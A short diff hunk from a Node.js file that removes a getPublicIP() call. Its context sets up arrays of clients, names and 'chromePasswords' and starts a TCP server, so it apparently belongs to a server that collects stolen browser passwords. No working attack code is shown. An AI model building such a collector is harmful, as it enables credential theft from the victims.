@@ -9,7 +9,6 @@ var clients = [];
 var names = [];
 var chromePasswords = [];
 
-getPublicIP();
 startPromt();
 // Start a TCP Server
 net.createServer(function (socket) {
